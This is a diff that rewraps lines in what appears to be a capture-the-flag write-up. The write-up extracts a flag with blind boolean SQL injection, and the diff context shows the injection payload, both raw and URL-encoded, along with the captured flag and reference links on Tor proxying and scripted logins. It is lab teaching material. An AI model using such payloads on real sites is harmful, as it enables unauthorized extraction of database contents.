@@ -66,7 +66,8 @@ on to the next character. Repeat this action, the flag will show up
 AND EXISTS(SELECT 1 FROM flags WHERE ORD(SUBSTR((SELECT flag FROM flags LIMIT 1,1), 1)) <= 79)
 ```
 
-Finally, our sophisticated query string which will be appended to the base url is
+Finally, our sophisticated query string which will be appended to the base url
+is
 
 ```sql
 %20and%20exists(select%201%20from%20flags%20where%20ord(substr((select%20flag%20from%20flags%20limit%201,1),%201))%20%3C=%2079)
@@ -127,12 +128,17 @@ The flag is `SECPROC{Hey,D0n't_f0rg3t_g0_thr0ugh_an0nymity_n3tw0rk.}`
 -  [tutorial SQL injection - LampSecurity CTF 6][2]
 -  [MySQL - String Functions][3]
 -  [Python's mechanize to login like a user][4]
--  [stack overflow - using tor as a SOCKS5 proxy with python urllib2 or mechanize][5]
+-  [stack overflow - using tor as a SOCKS5 proxy with python urllib2 or
+   mechanize][5]
 -  [stack overflow - python re.sub group: number after \number][6]
 
 [1]: https://b3rn3d.herokuapp.com/blog/2014/03/05/tor-country-codes
 [2]: http://www.infond.fr/2010/06/tutorial-sql-injection-lampsecurity-ctf.html
-[3]: http://dev.mysql.com/doc/refman/5.0/en/string-functions.html#function_substr
-[4]: http://simplapi.wordpress.com/2012/04/20/pythons-mechanize-login-like-a-user/
-[5]: http://stackoverflow.com/questions/14449974/using-tor-as-a-socks5-proxy-with-python-urllib2-or-mechanize
-[6]: http://stackoverflow.com/questions/5984633/python-re-sub-group-number-after-number
+[3]:
+http://dev.mysql.com/doc/refman/5.0/en/string-functions.html#function_substr
+[4]:
+http://simplapi.wordpress.com/2012/04/20/pythons-mechanize-login-like-a-user/
+[5]:
+http://stackoverflow.com/questions/14449974/using-tor-as-a-socks5-proxy-with-python-urllib2-or-mechanize
+[6]:
+http://stackoverflow.com/questions/5984633/python-re-sub-group-number-after-number
